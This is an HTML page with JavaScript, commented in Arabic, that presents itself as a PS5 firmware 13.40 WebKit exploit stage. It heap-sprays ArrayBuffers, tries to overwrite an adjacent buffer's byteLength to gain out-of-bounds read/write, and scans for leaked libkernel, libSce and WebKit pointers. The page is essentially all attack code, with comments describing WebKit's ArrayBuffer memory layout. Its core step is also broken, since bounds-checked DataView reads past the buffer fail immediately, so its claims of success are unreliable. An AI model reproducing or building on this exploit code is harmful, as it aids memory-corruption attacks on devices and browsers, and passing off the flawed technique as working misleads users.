<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>PS5 13.40 · R/W Primitive</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0a0a0f;color:#e0e0e0;font-family:monospace;padding:10px}
h1{color:#ff4757;font-size:16px;text-align:center}
.box{background:#111;border:1px solid #222;border-radius:6px;padding:8px;margin-bottom:8px;font-size:10px;line-height:1.6}
.l{color:#74b9ff}
.btn{display:block;width:100%;padding:12px 0;font-size:14px;font-weight:700;border:none;border-radius:6px;cursor:pointer;margin-bottom:6px;text-align:center}
.btn:active{opacity:0.7}
.btn-r{background:#c0392b;color:#fff}
.btn-g{background:#27ae60;color:#fff}
.btn-b{background:#2980b9;color:#fff}
#log{background:#0d0d12;border:1px solid #1a1a2e;border-radius:6px;padding:8px;height:280px;overflow-y:auto;font-size:10px;line-height:1.4;font-family:monospace}
.ok{color:#55efc4}.err{color:#ff6b6b}.warn{color:#fdcb6e}.ptr{color:#d4a0ff}.crit{color:#ff4757}
</style>
</head>
<body>

<h1>PS5 13.40 · R/W PRIMITIVE</h1>
<p class="l">ArrayBuffer header manipulation → OOB read/write</p>

<div class="box">
  <div class="l">Phase 1 (Spray): <span id="s1">—</span></div>
  <div class="l">Phase 2 (Corrupt): <span id="s2">—</span></div>
  <div class="l">Phase 3 (Read): <span id="s3">—</span></div>
</div>

<button class="btn btn-r" onclick="phase1()">1. Spray + Abuse</button>
<button class="btn btn-g" onclick="phase2()">2. تعديل byteLength</button>
<button class="btn btn-b" onclick="phase3()">3. OOB Read/Write</button>

<div id="log">[SYSTEM] Ready. Start with Phase 1.<br></div>

<script>
function LOG(msg, cls) {
  if (!cls) cls = 'ok';
  document.getElementById('log').innerHTML += '<span class="'+cls+'">'+msg+'</span><br>';
  document.getElementById('log').scrollTop = document.getElementById('log').scrollHeight;
}
function SID(id, txt) {
  document.getElementById(id).textContent = txt;
}

// ==================== Double Helpers ====================
var _AB = new ArrayBuffer(8);
var _F64 = new Float64Array(_AB);
var _U32 = new Uint32Array(_AB);
function d2lo(d) { _F64[0]=d; return _U32[0]; }
function d2hi(d) { _F64[0]=d; return _U32[1]; }
function u2d(lo, hi) { _U32[0]=lo; _U32[1]=hi; return _F64[0]; }

// ==================== State ====================
var STATE = {
  corruptBuf: null,
  readBuf: null,
  readView32: null,
  readDV: null,
  root: null,
  success: false
};

// ==================== PHASE 1: Spray + Find ====================
function phase1() {
  LOG('=== Phase 1: Spray + Abuse ===', 'crit');
  
  // إنشاء عناصر DOM عشان نضغط الذاكرة
  var root = document.createElement('div');
  root.style.cssText = 'position:absolute;left:-9999px';
  document.body.appendChild(root);
  STATE.root = root;
  
  // إنشاء 200 ArrayBuffer بحجم 1024 (لنضغط heap)
  var bufs = [];
  for (var i = 0; i < 200; i++) {
    var ab = new ArrayBuffer(1024);
    var v = new Uint32Array(ab);
    // نكتب أرقام دليلية متصاعدة
    for (var j = 0; j < 32; j++) {
      v[j] = 0xBEEF0000 + (i * 32) + j;
    }
    bufs.push(ab);
  }
  LOG('[1] 200 ArrayBuffer(1024) منشأة', 'ok');
  
  // إنشاء 200 ArrayBuffer بحجم 128 (أصغر)
  var bufs2 = [];
  for (var i = 0; i < 200; i++) {
    var ab = new ArrayBuffer(128);
    bufs2.push(ab);
  }
  LOG('[2] 200 ArrayBuffer(128) منشأة', 'ok');
  
  // GC قوي
  for (var g = 0; g < 30; g++) {
    new ArrayBuffer(8 * 1024 * 1024);
  }
  LOG('[3] GC تم', 'ok');
  
  STATE.bufs = bufs;
  STATE.bufs2 = bufs2;
  
  SID('s1', '✅ ' + bufs.length + ' buffers');
  LOG('[OK] Spray جاهز', 'crit');
}

// ==================== PHASE 2: تعديل byteLength ====================
function phase2() {
  LOG('=== Phase 2: تعديل byteLength ===', 'crit');
  
  if (!STATE.bufs) {
    LOG('[-] شغّل Phase 1 أولاً', 'err');
    return;
  }
  
  try {
    // الفكرة: نصنع ArrayBuffer صغير (64 بايت)
    // ثم نستخدم DataView لكتابة قيم خارجة عن حدوده
    // هذا يسمح لنا بتعديل byteLength الـ ArrayBuffer التالي في الذاكرة
    
    var victim = new ArrayBuffer(64);
    var victim32 = new Uint32Array(victim);
    
    var spray = new ArrayBuffer(4096); // كبير عشان نضمن متجاورة
    var spray32 = new Uint32Array(spray);
    
    // نكتب قيم مميزة في الـ victim
    victim32[0] = 0xCAFEBABE;
    victim32[1] = 0xDEADBEEF;
    victim32[2] = 0x13371337;
    
    LOG('[1] Victim buffer (64 bytes) created', 'ok');
    LOG('[2] Spray buffer (4096 bytes) created', 'ok');
    
    // نخزنهم
    STATE.victim = victim;
    STATE.victim32 = victim32;
    STATE.spray = spray;
    STATE.spray32 = spray32;
    
    // نحاول نغير byteLength عبر الكتابة خارج Victim
    // في بنية WebKit:
    // JSArrayBuffer header يحتوي:
    // [0x00] JSCell (16 bytes)
    // [0x10] butterfly (8 bytes, usually null)
    // [0x18] m_impl (8 bytes) -> ArrayBuffer*
    //
    // ArrayBuffer C++ object:
    // [0x00] vtable_ptr (8 bytes)
    // [0x08] m_data (8 bytes) -> void*
    // [0x10] m_size / m_byteLength (8 bytes) <- هذا اللي نبي نغيره
    
    // الفرق بين عنوان victim و الـ buffer اللي بعده
    // هذا يعتمد على ترتيب المخصص (fastMalloc)
    
    var dv = new DataView(victim);
    
    // نحاول قراءة/كتابة بعد حدود الـ 64 بايت
    // كل 8 بايت نبحث عن القيمة المميزة أو byteLength
    LOG('[3] Scanning for adjacent buffer headers...', 'warn');
    
    var found = 0;
    
    // نقرأ من offset 64 إلى offset 512
    for (var off = 64; off < 512; off += 4) {
      try {
        var val = dv.getUint32(off, true);
        
        // هل وجدنا القيمة المميزة من spray32؟
        if (val >= 0xBEEF0000 && val <= 0xBEEF2000) {
          LOG('[FOUND] spray data at offset ' + off + ': ' + hex(val), 'ptr');
          found++;
        }
        
        // هل وجدنا 64؟ (حجم الـ victim — يعني byteLength)
        if (val === 64) {
          LOG('[!] byteLength (64) found at offset ' + off, 'crit');
          
          // نعدّل الـ byteLength إلى 0x7FFFFFFF (2 مليار بايت)
          // هذا يخلّي الـ victim buffer يقرأ/يكتب في أي مكان
          dv.setUint32(off, 0x7FFFFFFF, true);
          LOG('[!] byteLength changed to 0x7FFFFFFF!', 'crit');
          
          STATE.corruptBuf = victim;
          STATE.corruptOff = off;
          found += 1000;
        }
        
        // هل وجدنا 4096؟ (حجم الـ spray)
        if (val === 4096) {
          LOG('[!] byteLength (4096) found at offset ' + off, 'crit');
          
          dv.setUint32(off, 0x7FFFFFFF, true);
          LOG('[!] spray byteLength changed to 0x7FFFFFFF!', 'crit');
          
          STATE.corruptBuf = spray;
          STATE.corruptOff = off;
          found += 1000;
        }
      } catch(e) {
        // قراءة خارج الحدود — متوقع
        LOG('[OOB] Read error at offset ' + off + ': ' + e.message.slice(0,30), 'warn');
        break;
      }
    }
    
    if (found > 1000) {
      LOG('[✅] byteLength modified! OOB read/write possible!', 'crit');
      SID('s2', '✅ byteLength = 0x7FFFFFFF');
      STATE.success = true;
    } else if (found > 0) {
      LOG('[⚠] Found ' + found + ' buffer in memory, but byteLength not found', 'warn');
      LOG('[!] حاول Phase 2 مرة أخرى — الترتيب في الذاكرة يختلف', 'warn');
      SID('s2', '⚠ Spray found, byteLength?');
    } else {
      LOG('[-] لم نجد أي شيء — الترتيب يختلف', 'err');
      SID('s2', '❌ لم نجد headers');
    }
    
  } catch(e) {
    LOG('[ERR] ' + e.message, 'err');
  }
}

function hex(v) {
  return '0x' + (v >>> 0).toString(16).padStart(8, '0');
}

// ==================== PHASE 3: OOB Read/Write ====================
function phase3() {
  LOG('=== Phase 3: OOB Read/Write ===', 'crit');
  
  if (!STATE.success) {
    LOG('[-] Phase 2 فشل — الـ byteLength ما تعدل', 'err');
    return;
  }
  
  try {
    var buf = STATE.corruptBuf;
    var dv = new DataView(buf);
    
    // الآن الـ byteLength = 0x7FFFFFFF (2^31 - 1)
    // يعني نقدر نقرأ/نكتب في كل الذاكرة
    
    LOG('[1] byteLength = ' + buf.byteLength, 'ok');
    
    if (buf.byteLength < 0x100000) {
      LOG('[!] byteLength لم يتغير — نحاول طريقة أخرى', 'warn');
      
      // جرب offset آخر
      for (var off = 32; off < 256; off += 4) {
        try {
          var val = dv.getUint32(off, true);
          if ((val >= 64 && val <= 128) || (val >= 1024 && val <= 4096)) {
            dv.setUint32(off, 0x7FFFFFFF, true);
            LOG('[!] byteLength عند offset ' + off + ': ' + buf.byteLength, 'crit');
            break;
          }
        } catch(e) {}
      }
    }
    
    if (buf.byteLength > 0x100000) {
      LOG('[2] ✅ OOB read/write جاهز!', 'crit');
      
      // ========== قراءة عناوين من الذاكرة ==========
      LOG('[3] Scanning for addresses...', 'warn');
      
      var found = 0;
      for (var off2 = 0; off2 < 1024; off2 += 8) {
        try {
          var lo = dv.getUint32(off2, true);
          var hi = dv.getUint32(off2 + 4, true);
          
          // ARM64 addresses: hi عالية
          if (hi >= 0x10000000 && hi <= 0xFFFFFFFF) {
            var full = '0x' + hi.toString(16).padStart(8, '0') + lo.toString(16).padStart(8, '0');
            
            var type = '';
            if (hi >= 0x80000000) type = ' (libkernel?)';
            else if (hi >= 0x70000000 && hi < 0x80000000) type = ' (libSce?)';
            else if (hi >= 0x10000000 && hi < 0x30000000) type = ' (WebKit?)';
            else type = '';
            
            LOG('  ' + full + type, 'ptr');
            found++;
            
            if (found >= 20) {
              LOG('[!] ... وأكثر', 'warn');
              break;
            }
          }
        } catch(e) {
          break;
        }
      }
      
      LOG('[4] ' + found + ' address(es) found', found > 0 ? 'crit' : 'warn');
      SID('s3', '✅ ' + found + ' addrs');
      
      STATE.readBuf = buf;
      STATE.readDV = dv;
      
    } else {
      LOG('[❌] byteLength لم يتغير — نحتاج offset مختلف', 'err');
      SID('s3', '❌ فشل');
    }
    
  } catch(e) {
    LOG('[ERR] ' + e.message, 'err');
  }
}

LOG('[SYSTEM] PS5 13.40 · R/W Primitive', 'ok');
LOG('الخطوات: 1. Spray → 2. Corrupt byteLength → 3. OOB Read', 'ok');
</script>
</body>
</html>
